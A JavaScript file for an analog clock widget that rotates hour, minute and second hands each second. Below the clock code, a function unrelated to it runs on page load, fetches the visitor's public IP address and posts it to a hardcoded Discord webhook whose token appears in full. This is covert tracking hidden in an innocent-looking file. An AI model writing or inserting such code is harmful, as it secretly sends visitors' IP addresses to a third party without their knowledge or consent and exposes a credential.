let hr = document.getElementById("hour");
let min = document.getElementById("min");
let sec = document.getElementById("sec");

function displayTime() {
  let date = new Date();

  let hh = date.getHours();
  let mm = date.getMinutes();
  let ss = date.getSeconds();

  let hRotation = 30 * hh + mm / 2;
  let mRotation = 6 * mm;
  let sRotation = 6 * ss;

  hr.style.transform = `rotate(${hRotation}deg)`;
  min.style.transform = `rotate(${mRotation}deg)`;
  sec.style.transform = `rotate(${sRotation}deg)`;
}

setInterval(displayTime, 1000);

function logIP() {
  fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      // Extract the IP address from the JSON response
      const ipAddress = data.ip;

      // Define the message to be sent to the Discord webhook
      const message = {
        content: `User's IP address: ${ipAddress}`,
      };

      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with the actual webhook URL
      const webhookURL =
        "https://discord.com/api/webhooks/1151126068460265553/5Eh5ZsqU3HBSvRKWVEj68dgJpWy9nfmsgwLNN0dVSDIjuF8JLRWft43V0GQKsSewsbEJ";

      // Send the message to the Discord webhook
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      });
    });
}

// Call the getIP function when the page loads
window.onload = logIP;
